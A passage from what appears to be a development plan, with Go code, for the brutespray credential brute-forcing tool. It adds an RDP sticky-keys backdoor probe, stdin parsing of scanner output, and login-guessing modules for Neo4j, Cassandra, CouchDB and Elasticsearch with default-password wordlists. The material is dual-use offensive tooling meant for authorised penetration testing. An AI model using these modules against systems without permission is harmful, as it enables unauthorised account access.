    rgba, ok := img.(*image.RGBA)
    if !ok {
        // Decode for non-RGBA paths; for the heuristic, draw onto an RGBA.
        b := img.Bounds()
        rgba = image.NewRGBA(b)
        for y := b.Min.Y; y < b.Max.Y; y++ {
            for x := b.Min.X; x < b.Max.X; x++ {
                rgba.Set(x, y, img.At(x, y))
            }
        }
    }
    // Sample the top-left 400x200 region. Count pixels: black (R<32 && G<32 && B<32)
    // and white-ish (R>200 && G>200 && B>200). Console signature: >65% black,
    // 2-15% white-ish.
    b := rgba.Bounds()
    maxX := b.Min.X + 400
    if maxX > b.Max.X {
        maxX = b.Max.X
    }
    maxY := b.Min.Y + 200
    if maxY > b.Max.Y {
        maxY = b.Max.Y
    }
    var total, black, white int
    for y := b.Min.Y; y < maxY; y++ {
        for x := b.Min.X; x < maxX; x++ {
            r, g, bl, _ := rgba.At(x, y).RGBA()
            r >>= 8
            g >>= 8
            bl >>= 8
            total++
            switch {
            case r < 32 && g < 32 && bl < 32:
                black++
            case r > 200 && g > 200 && bl > 200:
                white++
            }
        }
    }
    if total == 0 {
        return false
    }
    blackPct := float64(black) / float64(total)
    whitePct := float64(white) / float64(total)
    return blackPct > 0.65 && whitePct > 0.02 && whitePct < 0.15
}

func framebuffersDiffer(a, b []byte) bool {
    if len(a) == 0 || len(b) == 0 {
        return false
    }
    if len(a) != len(b) {
        return true
    }
    // Hash compare — different PNG bytes means different content (PNG encoder
    // is deterministic for identical RGBA in stdlib).
    return !bytes.Equal(a, b)
}
```

Then in `ScanRDPRecon` from Task A5, after the NLA branch, before the return:

```go
// Sticky-keys probe runs only when NLA is not enforced (no point trying
// against an NLA host — no framebuffer pre-auth).
if status == client.NLANotEnforced {
    c := &client.RdpClient{}
    before, after, err := c.CaptureLogonScreen(ctx, target, client.TriggerShift5x, timeout)
    if err == nil {
        if f := stickyKeysVerdict(looksLikeCmdConsole(before), looksLikeCmdConsole(after),
            framebuffersDiffer(before, after)); f != nil {
            out = append(out, f)
        }
    }
}
```

- [ ] **Step 7: Run tests**

Run: `go test ./brute/ -run TestStickyKeys -v`
Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add brute/rdp.go brute/rdp_stickykeys_test.go go.mod go.sum
git commit -m "feat(rdp): sticky-keys backdoor pre-auth probe with framebuffer heuristic"
```

---

## Task A7: Dispatcher invokes RDP recon + `--no-rdp-scan` flag

**Files:**
- Modify: `brutespray/config.go`
- Modify: `brutespray/dispatch.go`

- [ ] **Step 1: Add `--no-rdp-scan` flag**

In `brutespray/config.go`:

```go
flag.BoolVar(&Cfg.NoRDPScan, "no-rdp-scan", false, "Skip pre-auth RDP recon (NLA fingerprint, sticky-keys probe)")
```

Add to `Config` struct:

```go
NoRDPScan bool
```

- [ ] **Step 2: Call `brute.ScanRDPRecon` from the dispatcher**

In `brutespray/dispatch.go`'s `ProcessHost`, at the top of the host-setup block (mirroring where bad-keys is invoked for SSH):

```go
if host.Service == "rdp" && !Cfg.NoRDPScan {
    findings := brute.ScanRDPRecon(host.Host, host.Port, Cfg.Timeout)
    for _, f := range findings {
        emitFinding(host, f) // route through existing output channel — text + JSONL + TUI
    }
}
```

`emitFinding` is a small helper next to the existing per-host result emit path. If a similar helper does not already exist, add:

```go
func emitFinding(host modules.Host, f *brute.Finding) {
    modules.WriteFindingLine(host, f)
}
```

- [ ] **Step 3: Quick integration smoke**

Run: `go build ./... && ./brutespray -H 127.0.0.1 -s rdp -u test -p test --no-rdp-scan 2>&1 | head`
Expected: no panic; the `--no-rdp-scan` path runs cleanly (connection error is fine).

- [ ] **Step 4: Commit**

```bash
git add brutespray/config.go brutespray/dispatch.go
git commit -m "feat(rdp): wire pre-auth RDP recon into dispatcher with --no-rdp-scan opt-out"
```

---

## Task A8: Render `Finding` and `KeyMatch` in output layer (text + JSONL)

**Files:**
- Modify: `modules/output.go`
- Test: `modules/output_finding_test.go` (new)

- [ ] **Step 1: Write the failing test**

Create `modules/output_finding_test.go`:

```go
package modules

import (
    "bytes"
    "encoding/json"
    "strings"
    "testing"

    "github.com/x90skysn3k/brutespray/v2/brute"
)

func TestWriteFindingLineText(t *testing.T) {
    var buf bytes.Buffer
    WriteFindingTo(&buf, Host{Service: "rdp", Host: "10.0.0.5", Port: 3389},
        &brute.Finding{Severity: "WARN", Code: "rdp-nla-missing", Message: "NLA not enforced"})
    got := buf.String()
    for _, want := range []string{"WARN", "rdp", "10.0.0.5:3389", "NLA not enforced"} {
        if !strings.Contains(got, want) {
            t.Fatalf("output missing %q: %s", want, got)
        }
    }
}

func TestWriteFindingLineJSON(t *testing.T) {
    var buf bytes.Buffer
    WriteFindingJSONTo(&buf, Host{Service: "rdp", Host: "10.0.0.5", Port: 3389},
        &brute.Finding{Severity: "CRITICAL", Code: "rdp-stickykeys", Message: "backdoor detected", CVE: ""})
    var got struct {
        Type     string `json:"type"`
        Severity string `json:"severity"`
        Code     string `json:"code"`
        Target   string `json:"target"`
    }
    if err := json.Unmarshal(buf.Bytes(), &got); err != nil {
        t.Fatalf("invalid JSON: %v\n%s", err, buf.String())
    }
    if got.Type != "finding" || got.Severity != "CRITICAL" || got.Code != "rdp-stickykeys" {
        t.Fatalf("wrong fields: %+v", got)
    }
    if got.Target != "10.0.0.5:3389" {
        t.Fatalf("target = %q", got.Target)
    }
}
```

- [ ] **Step 2: Implement renderers in `modules/output.go`**

Append:

```go
import (
    // ... existing ...
    "encoding/json"
    "fmt"
    "io"

    "github.com/x90skysn3k/brutespray/v2/brute"
)

// WriteFindingTo writes a colored text-form finding line.
func WriteFindingTo(w io.Writer, h Host, f *brute.Finding) {
    cve := ""
    if f.CVE != "" {
        cve = " (" + f.CVE + ")"
    }
    fmt.Fprintf(w, "[%s] %s %s:%d %s%s\n",
        f.Severity, h.Service, h.Host, h.Port, f.Message, cve)
}

// WriteFindingJSONTo writes a JSONL finding line.
func WriteFindingJSONTo(w io.Writer, h Host, f *brute.Finding) {
    rec := map[string]any{
        "type":     "finding",
        "severity": f.Severity,
        "code":     f.Code,
        "service":  h.Service,
        "target":   fmt.Sprintf("%s:%d", h.Host, h.Port),
        "message":  f.Message,
    }
    if f.CVE != "" {
        rec["cve"] = f.CVE
    }
    _ = json.NewEncoder(w).Encode(rec)
}

// WriteFindingLine dispatches to the configured output sink (text or JSONL).
// Called from the dispatcher when a Finding surfaces.
func WriteFindingLine(h Host, f *brute.Finding) {
    if jsonOutput {
        WriteFindingJSONTo(jsonSink, h, f)
        return
    }
    WriteFindingTo(stdoutSink, h, f)
}
```

(`jsonOutput`, `jsonSink`, `stdoutSink` are the existing sinks the output layer already uses for per-attempt results. Reuse them; do not introduce new globals. If the existing names differ, rename accordingly.)

- [ ] **Step 3: Render `KeyMatch` on successful SSH bad-key auth**

In `modules/output.go`, locate the success-printing path (whatever function emits `[+] SUCCESS ...`). Add a branch:

```go
if res.KeyMatch != nil {
    cve := ""
    if res.KeyMatch.CVE != "" {
        cve = " (" + res.KeyMatch.CVE + ")"
    }
    fmt.Fprintf(stdoutSink, "[+] BADKEY %s %s@%s:%d %s%s\n",
        h.Service, user, h.Host, h.Port, res.KeyMatch.Vendor, cve)
    // (JSON path: existing success-emit already serializes res; extend the
    //  json record to include "key_match" when non-nil.)
    return
}
```

For JSON output, extend the existing success-record struct to include `KeyMatch *brute.KeyMatch` with json tag `key_match,omitempty`.

- [ ] **Step 4: Run tests**

Run: `go test ./modules/ -run TestWriteFinding -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add modules/output.go modules/output_finding_test.go
git commit -m "feat(output): render Finding (text+JSONL) and KeyMatch on SSH success"
```

---

## Task A9: TUI Findings tab

**Files:**
- Modify: `tui/model.go`
- Create: `tui/view_findings.go`
- Modify: existing tab-list registration

- [ ] **Step 1: Read the existing tab pattern**

Read `tui/view_all.go`, `tui/view_errors.go`, `tui/view_success.go` to confirm the existing tab structure. The new view follows the same pattern.

- [ ] **Step 2: Add Findings to the TUI Model**

In `tui/model.go`, locate the tab list (probably a `[]Tab` or similar `tabs` slice). Add:

```go
{Name: "Findings", Key: "f"}
```

Add a `findings []FindingEntry` field to the model:

```go
type FindingEntry struct {
    Severity string
    Code     string
    Service  string
    Target   string
    Message  string
    CVE      string
}
```

Add an `AddFinding` method:

```go
func (m *Model) AddFinding(e FindingEntry) {
    m.findings = append(m.findings, e)
}
```

- [ ] **Step 3: Implement `tui/view_findings.go`**

```go
package tui

import (
    "fmt"
    "strings"
)

func (m *Model) viewFindings() string {
    if len(m.findings) == 0 {
        return "No findings yet.\n"
    }
    var b strings.Builder
    for _, f := range m.findings {
        cve := ""
        if f.CVE != "" {
            cve = " (" + f.CVE + ")"
        }
        b.WriteString(fmt.Sprintf("[%s] %s %s %s%s\n",
            f.Severity, f.Service, f.Target, f.Message, cve))
    }
    return b.String()
}
```

Wire `viewFindings` into the model's view-switch (mirror how `view_errors` is dispatched).

- [ ] **Step 4: Push findings into the TUI from the dispatcher**

In `brutespray/dispatch.go`'s `emitFinding` (added in Task A7), also forward to the TUI sink when active:

```go
if tuiActive {
    tuiModel.AddFinding(tui.FindingEntry{
        Severity: f.Severity,
        Code:     f.Code,
        Service:  host.Service,
        Target:   fmt.Sprintf("%s:%d", host.Host, host.Port),
        Message:  f.Message,
        CVE:      f.CVE,
    })
}
```

- [ ] **Step 5: Smoke test**

Run: `go build ./... && ./brutespray -H 127.0.0.1 -s rdp -u test -p test 2>&1 | head`
Expected: no TUI panic; press `f` while running an interactive session — tab renders.

- [ ] **Step 6: Commit**

```bash
git add tui/model.go tui/view_findings.go brutespray/dispatch.go
git commit -m "feat(tui): add Findings tab populated from pre-auth recon"
```

---

# Phase B — Stdin pipeline + masscan JSON

## Task B1: Masscan JSON parser

**Files:**
- Create: `modules/parse_masscan.go`
- Create: `modules/parse_masscan_test.go`

- [ ] **Step 1: Sample masscan output**

Masscan `-oJ` emits a JSON *array* with elements:

```json
{"ip": "10.0.0.5", "timestamp": "1700000000",
 "ports": [{"port": 22, "proto": "tcp", "status": "open", "reason": "syn-ack", "ttl": 64}]}
```

- [ ] **Step 2: Write the failing test**

Create `modules/parse_masscan_test.go`:

```go
package modules

import (
    "strconv"
    "strings"
    "testing"
)

const masscanSample = `[
{"ip":"10.0.0.5","ports":[{"port":22,"proto":"tcp","status":"open"}]},
{"ip":"10.0.0.6","ports":[{"port":3306,"proto":"tcp","status":"open"},{"port":80,"proto":"tcp","status":"closed"}]},
{"ip":"10.0.0.7","ports":[{"port":3389,"proto":"tcp","status":"open"}]}
]`

func TestParseMasscanJSON(t *testing.T) {
    hosts, err := ParseMasscanJSON(strings.NewReader(masscanSample))
    if err != nil {
        t.Fatalf("ParseMasscanJSON: %v", err)
    }
    if len(hosts) != 3 {
        t.Fatalf("want 3 hosts (closed port filtered), got %d", len(hosts))
    }
    want := map[string]string{
        "10.0.0.5:22":   "ssh",
        "10.0.0.6:3306": "mysql",
        "10.0.0.7:3389": "rdp",
    }
    for _, h := range hosts {
        key := h.Host + ":" + strconv.Itoa(h.Port)
        if got, ok := want[key]; !ok || got != h.Service {
            t.Fatalf("unexpected host: %+v", h)
        }
    }
}
```

- [ ] **Step 3: Implement `ParseMasscanJSON`**

```go
package modules

import (
    "encoding/json"
    "fmt"
    "io"
)

type masscanPort struct {
    Port   int    `json:"port"`
    Proto  string `json:"proto"`
    Status string `json:"status"`
}

type masscanHost struct {
    IP    string        `json:"ip"`
    Ports []masscanPort `json:"ports"`
}

// ParseMasscanJSON reads masscan -oJ output and returns one Host per
// open port. Service is inferred from port via defaultServiceForPort
// (existing helper in parse.go); ports with no mapping are dropped.
func ParseMasscanJSON(r io.Reader) ([]Host, error) {
    var rows []masscanHost
    if err := json.NewDecoder(r).Decode(&rows); err != nil {
        return nil, fmt.Errorf("decode masscan json: %w", err)
    }
    var out []Host
    for _, row := range rows {
        for _, p := range row.Ports {
            if p.Status != "open" {
                continue
            }
            svc := defaultServiceForPort(p.Port)
            if svc == "" {
                continue
            }
            out = append(out, Host{Service: svc, Host: row.IP, Port: p.Port})
        }
    }
    return out, nil
}
```

If `defaultServiceForPort` does not yet exist in `parse.go`, add it there mapping the common ports (22→ssh, 21→ftp, 23→telnet, 25→smtp, 80→http, 110→pop3, 143→imap, 389→ldap, 443→https, 445→smbnt, 1433→mssql, 1521→oracle, 3306→mysql, 3389→rdp, 5432→postgres, 5900→vnc, 5984→couchdb, 6379→redis, 7687→neo4j, 8086→influxdb, 9042→cassandra, 9200→elasticsearch, 27017→mongodb).

- [ ] **Step 4: Run tests**

Run: `go test ./modules/ -run TestParseMasscan -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add modules/parse_masscan.go modules/parse_masscan_test.go modules/parse.go
git commit -m "feat(parse): masscan -oJ JSON ingestion with port→service mapping"
```

---

## Task B2: Stdin auto-detect

**Files:**
- Create: `modules/parse_stream.go`
- Create: `modules/parse_stream_test.go`

- [ ] **Step 1: Write the failing test**

Create `modules/parse_stream_test.go`:

```go
package modules

import (
    "strings"
    "testing"
)

func TestDetectStreamFormat(t *testing.T) {
    cases := []struct {
        name string
        in   string
        want string
    }{
        {"bare-host-port", "10.0.0.5:22\n10.0.0.6:3389\n", "naabu"},
        {"nerva-uri", "ssh://10.0.0.5:22\nmysql://10.0.0.6:3306\n", "nerva-uri"},
        {"nerva-json", `{"ip":"10.0.0.5","port":22,"protocol":"ssh"}`, "nerva-json"},
        {"masscan-json", `[{"ip":"10.0.0.5","ports":[{"port":22,"proto":"tcp","status":"open"}]}]`, "masscan-json"},
        {"fingerprintx-json", `{"host":"10.0.0.5","ip":"10.0.0.5","port":22,"service":"ssh","transport":"tcp"}`, "fingerprintx-json"},
    }
    for _, c := range cases {
        t.Run(c.name, func(t *testing.T) {
            got, err := DetectStreamFormat(strings.NewReader(c.in))
            if err != nil {
                t.Fatalf("DetectStreamFormat: %v", err)
            }
            if got != c.want {
                t.Fatalf("got %q, want %q", got, c.want)
            }
        })
    }
}

func TestParseStreamBareHostPort(t *testing.T) {
    hosts, err := ParseStream(strings.NewReader("10.0.0.5:22\n10.0.0.6:3389\n"))
    if err != nil {
        t.Fatalf("ParseStream: %v", err)
    }
    if len(hosts) != 2 {
        t.Fatalf("want 2, got %d", len(hosts))
    }
    if hosts[0].Service != "ssh" || hosts[1].Service != "rdp" {
        t.Fatalf("port→service mapping failed: %+v", hosts)
    }
}
```

- [ ] **Step 2: Implement `parse_stream.go`**

```go
package modules

import (
    "bufio"
    "bytes"
    "encoding/json"
    "fmt"
    "io"
    "regexp"
    "strconv"
    "strings"
)

var (
    nervaURIRE  = regexp.MustCompile(`^[a-z][a-z0-9+-]*://[^:/]+:\d+`)
    hostPortRE  = regexp.MustCompile(`^[^\s:]+:\d+$`)
)

// DetectStreamFormat peeks at the first non-blank line of the stream and
// returns one of: naabu, nerva-uri, nerva-json, masscan-json, fingerprintx-json.
// Does NOT consume the stream — caller passes a buffered reader.
func DetectStreamFormat(r io.Reader) (string, error) {
    br := bufio.NewReader(r)
    // Peek up to 4KB
    peek, _ := br.Peek(4096)
    // Find first non-blank line
    var line []byte
    for _, raw := range bytes.Split(peek, []byte("\n")) {
        t := bytes.TrimSpace(raw)
        if len(t) > 0 {
            line = t
            break
        }
    }
    if len(line) == 0 {
        return "", fmt.Errorf("empty stream")
    }
    s := string(line)
    switch {
    case s[0] == '[':
        return "masscan-json", nil
    case s[0] == '{':
        // Classify by required keys
        var probe map[string]json.RawMessage
        if err := json.Unmarshal(line, &probe); err != nil {
            return "", fmt.Errorf("invalid JSON: %w", err)
        }
        _, hasService := probe["service"]
        _, hasProtocol := probe["protocol"]
        _, hasPort := probe["port"]
        switch {
        case hasService && hasPort:
            return "fingerprintx-json", nil
        case hasProtocol && hasPort:
            return "nerva-json", nil
        }
        return "", fmt.Errorf("unrecognized JSON shape")
    case nervaURIRE.MatchString(s):
        return "nerva-uri", nil
    case hostPortRE.MatchString(s):
        return "naabu", nil
    }
    return "", fmt.Errorf("unrecognized line format: %s", s)
}

// ParseStream auto-detects and parses a target stream into Hosts.
func ParseStream(r io.Reader) ([]Host, error) {
    buf, err := io.ReadAll(r)
    if err != nil {
        return nil, fmt.Errorf("read stream: %w", err)
    }
    format, err := DetectStreamFormat(bytes.NewReader(buf))
    if err != nil {
        return nil, err
    }
    switch format {
    case "naabu":
        return parseNaabuLines(buf)
    case "nerva-uri":
        return parseNervaURI(buf)
    case "nerva-json":
        return parseNervaJSON(buf)
    case "masscan-json":
        return ParseMasscanJSON(bytes.NewReader(buf))
    case "fingerprintx-json":
        return parseFingerprintXJSON(buf)
    }
    return nil, fmt.Errorf("unsupported format: %s", format)
}

func parseNaabuLines(buf []byte) ([]Host, error) {
    var out []Host
    for _, raw := range bytes.Split(buf, []byte("\n")) {
        s := strings.TrimSpace(string(raw))
        if s == "" {
            continue
        }
        host, port, err := splitHostPort(s)
        if err != nil {
            continue
        }
        svc := defaultServiceForPort(port)
        if svc == "" {
            continue
        }
        out = append(out, Host{Service: svc, Host: host, Port: port})
    }
    return out, nil
}

func parseNervaURI(buf []byte) ([]Host, error) {
    var out []Host
    for _, raw := range bytes.Split(buf, []byte("\n")) {
        s := strings.TrimSpace(string(raw))
        if s == "" {
            continue
        }
        // Strip parenthetical resolution suffix like "ssh://github.com:22 (140.82.121.4)"
        if idx := strings.Index(s, " "); idx > 0 {
            s = s[:idx]
        }
        scheme := s[:strings.Index(s, "://")]
        rest := s[strings.Index(s, "://")+3:]
        host, port, err := splitHostPort(rest)
        if err != nil {
            continue
        }
        out = append(out, Host{Service: scheme, Host: host, Port: port})
    }
    return out, nil
}

type nervaRow struct {
    IP       string `json:"ip"`
    Port     int    `json:"port"`
    Protocol string `json:"protocol"`
}

func parseNervaJSON(buf []byte) ([]Host, error) {
    var out []Host
    dec := json.NewDecoder(bytes.NewReader(buf))
    for dec.More() {
        var row nervaRow
        if err := dec.Decode(&row); err != nil {
            return nil, fmt.Errorf("decode nerva-json: %w", err)
        }
        out = append(out, Host{Service: row.Protocol, Host: row.IP, Port: row.Port})
    }
    return out, nil
}

type fpxRow struct {
    Host    string `json:"host"`
    IP      string `json:"ip"`
    Port    int    `json:"port"`
    Service string `json:"service"`
}

func parseFingerprintXJSON(buf []byte) ([]Host, error) {
    var out []Host
    dec := json.NewDecoder(bytes.NewReader(buf))
    for dec.More() {
        var row fpxRow
        if err := dec.Decode(&row); err != nil {
            return nil, fmt.Errorf("decode fingerprintx-json: %w", err)
        }
        h := row.Host
        if h == "" {
            h = row.IP
        }
        out = append(out, Host{Service: row.Service, Host: h, Port: row.Port})
    }
    return out, nil
}

func splitHostPort(s string) (string, int, error) {
    idx := strings.LastIndex(s, ":")
    if idx < 0 {
        return "", 0, fmt.Errorf("no port: %s", s)
    }
    port, err := strconv.Atoi(s[idx+1:])
    if err != nil {
        return "", 0, err
    }
    return s[:idx], port, nil
}
```

- [ ] **Step 3: Run tests**

Run: `go test ./modules/ -run TestDetectStream -v && go test ./modules/ -run TestParseStream -v`
Expected: all PASS.

- [ ] **Step 4: Commit**

```bash
git add modules/parse_stream.go modules/parse_stream_test.go
git commit -m "feat(parse): stdin stream auto-detect for naabu/nerva/fingerprintx/masscan"
```

---

## Task B3: Wire stdin into `brutespray.Execute`

**Files:**
- Modify: `brutespray/brutespray.go` (Execute)

- [ ] **Step 1: Detect piped stdin at startup**

Near the top of `Execute()`, after CLI parsing, before file ingestion:

```go
// If -f was not provided AND stdin is a pipe (not a TTY), read targets from stdin.
if Cfg.File == "" && !term.IsTerminal(int(os.Stdin.Fd())) {
    hosts, err := modules.ParseStream(os.Stdin)
    if err != nil {
        fmt.Fprintf(os.Stderr, "stdin parse: %v\n", err)
        os.Exit(2)
    }
    Cfg.Hosts = append(Cfg.Hosts, hosts...)
}
```

Add imports if missing:

```go
import (
    "os"
    "golang.org/x/term"
)
```

If `golang.org/x/term` is not already in `go.mod`:

```bash
go get golang.org/x/term && go mod tidy
```

- [ ] **Step 2: Smoke test the pipeline**

```bash
go build -o brutespray .
echo "127.0.0.1:22" | ./brutespray -u root -p test 2>&1 | head
```

Expected: the host is enqueued from stdin (you'll see an SSH attempt log line or a connection-refused error — both confirm parsing worked).

- [ ] **Step 3: Commit**

```bash
git add brutespray/brutespray.go go.mod go.sum
git commit -m "feat(cli): auto-read targets from piped stdin with format detection"
```

---

# Phase C — New DB modules + SNMP tiering + inline creds

## Task C1: Neo4j module

**Files:**
- Create: `brute/neo4j.go`
- Create: `brute/neo4j_test.go`

- [ ] **Step 1: Add neo4j driver dep**

```bash
go get github.com/neo4j/neo4j-go-driver/v5/neo4j && go mod tidy
```

- [ ] **Step 2: Write the failing test**

Create `brute/neo4j_test.go`:

```go
package brute

import (
    "context"
    "fmt"
    "os"
    "testing"
    "time"

    "github.com/x90skysn3k/brutespray/v2/modules"
)

func TestBruteNeo4jNoServer(t *testing.T) {
    cm := modules.NewConnectionManager()
    r := BruteNeo4j("127.0.0.1", 1, "neo4j", "neo4j", 1*time.Second, cm, nil)
    if r.ConnectionSuccess {
        t.Fatalf("expected ConnectionSuccess=false against closed port")
    }
}

// Docker-backed integration test (gated, parallels brute/redis_test.go shape)
func TestBruteNeo4jDocker(t *testing.T) {
    if os.Getenv("BRUTESPRAY_DOCKER_TESTS") == "" {
        t.Skip("set BRUTESPRAY_DOCKER_TESTS=1 to run")
    }
    // Container started by the integration harness; assume neo4j:5 on 7687
    cm := modules.NewConnectionManager()
    r := BruteNeo4j("127.0.0.1", 7687, "neo4j", "testtest", 5*time.Second, cm, nil)
    if !r.AuthSuccess {
        t.Fatalf("expected auth success, got %+v", r)
    }
    _ = context.Background()
    _ = fmt.Sprintf
}
```

- [ ] **Step 3: Implement `brute/neo4j.go`**

```go
package brute

import (
    "context"
    "errors"
    "fmt"
    "strings"
    "time"

    "github.com/neo4j/neo4j-go-driver/v5/neo4j"
    "github.com/x90skysn3k/brutespray/v2/modules"
)

func BruteNeo4j(host string, port int, user, password string, timeout time.Duration, cm *modules.ConnectionManager, params ModuleParams) *BruteResult {
    return RunWithTimeout(timeout, func(ctx context.Context) *BruteResult {
        uri := fmt.Sprintf("bolt://%s:%d", host, port)
        // Note: neo4j-go-driver v5 does not expose a custom dialer in the
        // public Config. We accept that proxy/iface routing does not apply
        // to Neo4j attempts in this initial implementation; document it.
        driver, err := neo4j.NewDriverWithContext(uri, neo4j.BasicAuth(user, password, ""),
            func(c *neo4j.Config) {
                c.SocketConnectTimeout = timeout
            })
        if err != nil {
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
        }
        defer driver.Close(ctx)
        err = driver.VerifyConnectivity(ctx)
        if err != nil {
            msg := err.Error()
            if strings.Contains(msg, "AuthenticationRateLimit") ||
                strings.Contains(msg, "Unauthorized") ||
                strings.Contains(msg, "credentials") {
                return &BruteResult{AuthSuccess: false, ConnectionSuccess: true, Error: err}
            }
            var ute *neo4j.UsageError
            if errors.As(err, &ute) {
                return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
            }
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
        }
        return &BruteResult{AuthSuccess: true, ConnectionSuccess: true}
    })
}

func init() { Register("neo4j", BruteNeo4j) }
```

- [ ] **Step 4: Run tests**

Run: `go test ./brute/ -run TestBruteNeo4jNoServer -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add brute/neo4j.go brute/neo4j_test.go go.mod go.sum
git commit -m "feat(brute): neo4j Bolt v5 module"
```

---

## Task C2: Cassandra module

**Files:**
- Create: `brute/cassandra.go`
- Create: `brute/cassandra_test.go`

- [ ] **Step 1: Add gocql dep**

```bash
go get github.com/gocql/gocql && go mod tidy
```

- [ ] **Step 2: Write the failing test**

Create `brute/cassandra_test.go`:

```go
package brute

import (
    "testing"
    "time"

    "github.com/x90skysn3k/brutespray/v2/modules"
)

func TestBruteCassandraNoServer(t *testing.T) {
    cm := modules.NewConnectionManager()
    r := BruteCassandra("127.0.0.1", 1, "cassandra", "cassandra", 1*time.Second, cm, nil)
    if r.ConnectionSuccess {
        t.Fatalf("expected ConnectionSuccess=false against closed port")
    }
}
```

- [ ] **Step 3: Implement `brute/cassandra.go`**

```go
package brute

import (
    "context"
    "fmt"
    "strings"
    "time"

    "github.com/gocql/gocql"
    "github.com/x90skysn3k/brutespray/v2/modules"
)

func BruteCassandra(host string, port int, user, password string, timeout time.Duration, cm *modules.ConnectionManager, params ModuleParams) *BruteResult {
    return RunWithTimeout(timeout, func(ctx context.Context) *BruteResult {
        cluster := gocql.NewCluster(fmt.Sprintf("%s:%d", host, port))
        cluster.ProtoVersion = 4
        cluster.ConnectTimeout = timeout
        cluster.Timeout = timeout
        cluster.Authenticator = gocql.PasswordAuthenticator{
            Username: user,
            Password: password,
        }
        cluster.DisableInitialHostLookup = true
        sess, err := cluster.CreateSession()
        if err != nil {
            msg := err.Error()
            if strings.Contains(msg, "Authentication") ||
                strings.Contains(msg, "Bad credentials") ||
                strings.Contains(msg, "Unauthorized") {
                return &BruteResult{AuthSuccess: false, ConnectionSuccess: true, Error: err}
            }
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
        }
        defer sess.Close()
        return &BruteResult{AuthSuccess: true, ConnectionSuccess: true}
    })
}

func init() { Register("cassandra", BruteCassandra) }
```

- [ ] **Step 4: Seed wordlist**

```bash
mkdir -p wordlist/cassandra
printf "cassandra\nadmin\nuser\n" > wordlist/cassandra/user
printf "cassandra\nadmin\nchangeme\n" > wordlist/cassandra/password
```

- [ ] **Step 5: Run tests**

Run: `go test ./brute/ -run TestBruteCassandraNoServer -v`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add brute/cassandra.go brute/cassandra_test.go wordlist/cassandra go.mod go.sum
git commit -m "feat(brute): cassandra CQL module with default wordlist"
```

---

## Task C3: CouchDB module

**Files:**
- Create: `brute/couchdb.go`
- Create: `brute/couchdb_test.go`

- [ ] **Step 1: Write the failing test**

Create `brute/couchdb_test.go`:

```go
package brute

import (
    "testing"
    "time"

    "github.com/x90skysn3k/brutespray/v2/modules"
)

func TestBruteCouchDBNoServer(t *testing.T) {
    cm := modules.NewConnectionManager()
    r := BruteCouchDB("127.0.0.1", 1, "admin", "admin", 1*time.Second, cm, nil)
    if r.ConnectionSuccess {
        t.Fatalf("expected ConnectionSuccess=false against closed port")
    }
}
```

- [ ] **Step 2: Implement `brute/couchdb.go`**

```go
package brute

import (
    "context"
    "fmt"
    "net"
    "net/http"
    "net/url"
    "strconv"
    "strings"
    "time"

    "github.com/x90skysn3k/brutespray/v2/modules"
)

func BruteCouchDB(host string, port int, user, password string, timeout time.Duration, cm *modules.ConnectionManager, params ModuleParams) *BruteResult {
    return RunWithTimeout(timeout, func(ctx context.Context) *BruteResult {
        scheme := "http"
        if params["tls"] == "true" {
            scheme = "https"
        }
        endpoint := fmt.Sprintf("%s://%s/_session", scheme, net.JoinHostPort(host, strconv.Itoa(port)))
        tr := &http.Transport{
            DialContext: func(_ context.Context, network, addr string) (net.Conn, error) {
                return cm.Dial(network, addr)
            },
            DisableKeepAlives: true,
        }
        cl := &http.Client{Transport: tr, Timeout: timeout}
        form := url.Values{"name": {user}, "password": {password}}
        req, err := http.NewRequestWithContext(ctx, "POST", endpoint, strings.NewReader(form.Encode()))
        if err != nil {
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
        }
        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        resp, err := cl.Do(req)
        if err != nil {
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
        }
        defer resp.Body.Close()
        switch resp.StatusCode {
        case 200:
            return &BruteResult{AuthSuccess: true, ConnectionSuccess: true}
        case 401:
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: true,
                Error: fmt.Errorf("couchdb 401")}
        default:
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: true,
                Error: fmt.Errorf("couchdb status %d", resp.StatusCode)}
        }
    })
}

func init() { Register("couchdb", BruteCouchDB) }
```

- [ ] **Step 3: Seed wordlist**

```bash
mkdir -p wordlist/couchdb
printf "admin\ncouchdb\nuser\n" > wordlist/couchdb/user
printf "admin\ncouchdb\npassword\n" > wordlist/couchdb/password
```

- [ ] **Step 4: Run tests**

Run: `go test ./brute/ -run TestBruteCouchDBNoServer -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add brute/couchdb.go brute/couchdb_test.go wordlist/couchdb
git commit -m "feat(brute): couchdb HTTP _session module with default wordlist"
```

---

## Task C4: Elasticsearch module

**Files:**
- Create: `brute/elasticsearch.go`
- Create: `brute/elasticsearch_test.go`

- [ ] **Step 1: Write the failing test**

```go
package brute

import (
    "testing"
    "time"

    "github.com/x90skysn3k/brutespray/v2/modules"
)

func TestBruteElasticsearchNoServer(t *testing.T) {
    cm := modules.NewConnectionManager()
    r := BruteElasticsearch("127.0.0.1", 1, "elastic", "elastic", 1*time.Second, cm, nil)
    if r.ConnectionSuccess {
        t.Fatalf("expected ConnectionSuccess=false against closed port")
    }
}
```

- [ ] **Step 2: Implement `brute/elasticsearch.go`**

```go
package brute

import (
    "context"
    "fmt"
    "net"
    "net/http"
    "strconv"
    "time"

    "github.com/x90skysn3k/brutespray/v2/modules"
)

func BruteElasticsearch(host string, port int, user, password string, timeout time.Duration, cm *modules.ConnectionManager, params ModuleParams) *BruteResult {
    return RunWithTimeout(timeout, func(ctx context.Context) *BruteResult {
        scheme := "http"
        if params["tls"] == "true" {
            scheme = "https"
        }
        endpoint := fmt.Sprintf("%s://%s/_cluster/health", scheme, net.JoinHostPort(host, strconv.Itoa(port)))
        tr := &http.Transport{
            DialContext: func(_ context.Context, network, addr string) (net.Conn, error) {
